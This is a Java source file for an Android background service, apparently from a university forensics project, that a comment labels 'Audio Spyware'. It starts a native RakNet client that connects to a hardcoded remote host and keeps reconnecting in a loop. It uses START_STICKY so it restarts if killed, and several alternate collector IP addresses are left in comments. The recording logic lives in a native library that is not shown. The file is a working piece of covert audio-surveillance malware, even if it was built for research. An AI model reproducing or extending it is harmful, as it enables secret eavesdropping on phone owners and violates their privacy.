package com.forensic.unipg.silenceaudiorecording;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.IBinder;
import android.os.Process;
import android.support.annotation.Nullable;
import android.util.Log;

/**
 * Created by Gabriele on 30/05/16.
 */
public class SilenceAudioRecordingService extends Service implements Runnable
{
    static
    {
        System.load("libSilenceAudioRecordingNative.so");
    }

    //95.250.196.2
    //169.254.52.94
    //192.168.2.20
    //192.168.137.183
    //192.168.1.132
    //192.168.1.134
    //192.168.137.193
    private String  mHost = "192.168.1.132";
    private int     mPort = 8000; //not implemented yet
    private Thread  mThread = null;
    private boolean mLoop = true;

    //network available
    private boolean isNetworkAvailable()
    {
        ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        if(connectivityManager == null) return false;
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        if(activeNetworkInfo == null) return false;
        //return state
        return activeNetworkInfo.isConnected();
    }

    @Override
    public void run()
    {
        while(mLoop)
        {
            if (   RakClient.state() != RakClient.C_S_CONNECTED
                && RakClient.state() != RakClient.C_S_START
                && isNetworkAvailable())
            {
                //stop
                RakClient.stop();
                //re-try to restart
                RakClient.start(mHost);
                //sleep thread
                try
                {
                    Thread.sleep(2000);
                }
                catch (Exception e)
                {
                    Log.e("SilenceAudioRecordingService","run: "+ e.toString());
                }
            }
            else
            {
                //sleep thread
                try
                {
                    Thread.sleep(1000);
                }
                catch (Exception e)
                {
                    Log.e("SilenceAudioRecordingService", "run: " + e.toString());
                }
            }
        }
    }

    @Override
    public void onCreate()
    {
        super.onCreate();
        // Start RakNet client Audio Spyware
        RakClient.start(mHost);
        // Enable loop
        mLoop = true;
        // Start up the thread running the service.
        mThread = new Thread(this);
        mThread.start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
        // ignore the message
        // If we get killed, after returning from here, restart
        return START_STICKY;
    }


    @Override
    public void onDestroy()
    {
        //stop loop
        try
        {
            mLoop = false;
            mThread.join();
        }
        catch (Exception e)
        {
            Log.e("SilenceAudioRecordingService",
                  "onDestroy: "+e.toString());
        }
        //stop native
        RakClient.stop();
        //destoy all
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent)
    {
        return null;
    }

}
